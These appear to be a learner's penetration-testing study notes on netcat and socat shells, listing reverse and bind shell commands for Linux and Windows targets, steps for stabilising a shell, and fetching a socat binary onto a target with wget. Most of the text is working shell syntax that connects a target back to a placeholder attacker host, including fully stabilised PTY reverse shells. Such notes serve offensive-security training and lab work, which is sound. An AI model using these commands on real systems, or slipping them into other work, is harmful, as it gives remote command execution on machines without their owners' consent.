
--------------------WHAT THE SHELL?-----------------------

Netcat:
	Swiss army knife of networking
	
	- netcat shells are unstable (easy to lose)


Socat:
	Netcat on steroids

	- more stable shells
	- complex syntax
	- not installed on linux by default

Metasploit --multi/handler:
	exploit/multi/handler

	- the only way to interact with meterpreter shells
	- being part of metasploit provides ways to stable and improve shells
	- easyest way to handle staged payloads

Msfvenom:
	Used to generate payloads on the fly


# Repositories of shells in different languages:
	kali comes with /usr/share/webshells
	- Payloads all the things
	- PentestMonkey Reverse shell cheatsheet
	- Seclists repo


Types of shells:
    +Reverse shells:
	TARGET ------> ATTACKER

	- good bypass firewall
	- bad attacker network open ports

    +bind shells:
	TARGET<------- ATTACKER

	- need open ports on target network
	- firewall problems
	- not changing attacker network

    +interactive:
	Allows for user interaction (like ssh ask for a password, etc)

    +non-interactive:
	limited use of programs without interaction (no text editors, ssh, etc)


# EXAMPLES #


+REVERSE SHELL+

Netcat:

    ATTACKER:
	$: sudo nc -lvnp <port>

    TARGET:
	$: nc <attacker ip> <port> -e /bin/bash


+BIND SHELL+

Netcat:

    TARGET:
	$: nc -lvnp <port> -e "cmd.exe"

    ATTACKER:
	$: nc <target ip> <port>


#######   NETCAT   #######

Reverse shell:

    Listener syntax> $: nc -lnvp <port-number>

	-l: listener
	-v: verbose
	-n: don't resolve names or use DNS (only IP(?))
	-p: port to listen to

    Target syntax> $: nc <attacker-ip> <port> -e /bin/bash

	-e: execute (binary, exe, or path)



#        -= STABILISATION =-

Netcat shells are inestable by default.
Ctrl + c kills the whole thing
Non-interactive


---PYTHON---

    technique for linux boxes (normally comes with python)

	1. $: python -c 'import pty;pty.spawn("/bin/bash")'
		might require python version (python2, python3)

	2. $: export TERM=xterm
		gives access to commands like clear

	3. Ctrl+Z Background the shell
	   In our terminal use:
	   $: stty raw -echo; fg
	   turns off our own echo(acces to tab-complete, arrow keys, ctrl+c)



---rlwrap---

    Very usefull for Windows
    automatic history, autocomplete and arrow keys
    some stabilisation still required for Ctrl+C

rlwrap doesn't come preinstalled on kali: sudo apt install rlwrap

    Listener:
	$: rlwrap nc -lvnp <port>

    Gain Ctrl+C full stabilisation:
	Ctrl + Z then stt raw -echo; fg



---Socat---

    Socat is not stable on windows
    
    1. Initial netcat shell
    
    2. Transfer a socat static compiled binary
	2.1 sudo python3 -m http.server 80 (start local server on folder with socat)
	2.2 wget <LOCAL-IP>/socat -O /tmp/socat (download and open socat on target)



---Use text editors or other apps---

    Change the terminal tty size

	1. open a local terminal and type 'stty -a'
	2. in the reverse shell set the rows and columns
	    stty rows <number>
	    stty cols <number>



# SOCAT #

    Socat is similar to netcat. It provides a link between two points.

---Reverse shells---
    
    The sintax for socat is harder than netcat.
    Basic reverse shell sintax:
	
	socat TCP-L:<port> -

    This will work on linux and windows.

    -command to connect back on windows:
	
    	socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
	    The "pipes" option is used to force powershell to use Unix input and output

    -command to connect back on linux:

    	socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"



---Bind Shell---

    -linux target:

	socat TCP-L:<port> EXEC:"bash -li"

    -Windows target:

	socat TCP-L:<port> EXEC:powershell.exe,pipes

    -Attack machine:

	socat TCP:<TARGET-IP>:<TARGET-PORT> -



---STABLE SHELLS---

this will only work if the target is linux

    -listener:

	socat TCP-L:<port> FILE:'tty',raw,echo=0

    -special command to connect:

	socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

	    - pty, allocates a pseudoterminal on the target -- part of the stabilisation process
	    - stderr, makes sure that any error messages get shown in the shell
	    - sigint, passes any Ctrl+C commands through into the sub-process, allowing us to kill commands
	    - setsid, creates the process in a new session
	    - sane, stabilises the terminal, attempting to normalise it.


